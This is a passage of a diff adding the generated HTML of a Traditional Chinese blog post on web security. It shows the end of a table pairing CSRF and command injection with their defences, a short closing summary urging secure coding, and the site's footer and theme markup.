+<td style="text-align:left"><strong>使用 Anti-CSRF Token</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Command Injection</strong></td>
+<td style="text-align:left">伺服器作業系統</td>
+<td style="text-align:left">在使用者輸入中注入惡意系統命令，讓伺服器執行。</td>
+<td style="text-align:left"><strong>避免呼叫系統命令</strong> / <strong>嚴格白名單驗證</strong></td>
+</tr>
+</tbody>
+</table>
+<h1 id="總結"><a class="markdownIt-Anchor" href="#總結"></a> 總結</h1>
+<p>網站安全是一場永無止境的攻防戰。今天介紹的四種漏洞只是冰山一角，但它們是每個開發者都必須掌握的基礎知識。了解攻擊者的思維，才能更好地設計出堅不可摧的防禦工事。</p>
+<p>記住，安全的程式碼不是「寫完就好」，而是在開發的每一個環節中，都將安全性放在心上。讓我們一起努力，打造一個更安全、更值得信賴的網路世界！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/my-blog/tags/Application-Security/" rel="tag"># Application Security</a>
+              <a href="/my-blog/tags/Cyber-Security/" rel="tag"># Cyber Security</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/my-blog/2025/07/30/%E6%8F%AD%E7%A7%98%E5%89%8D%E7%AB%AF%E6%B8%B2%E6%9F%93%20CSR%20SSR%20SSG%20%E5%85%A8%E6%96%B9%E4%BD%8D%E8%A7%A3%E6%9E%90%E8%88%87%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97/" rel="prev" title="揭秘前端渲染：CSR、SSR、SSG 全方位解析與實戰指南">
+                  <i class="fa fa-angle-left"></i> 揭秘前端渲染：CSR、SSR、SSG 全方位解析與實戰指南
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Kaiwii</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 強力驅動
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="回到頂端">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
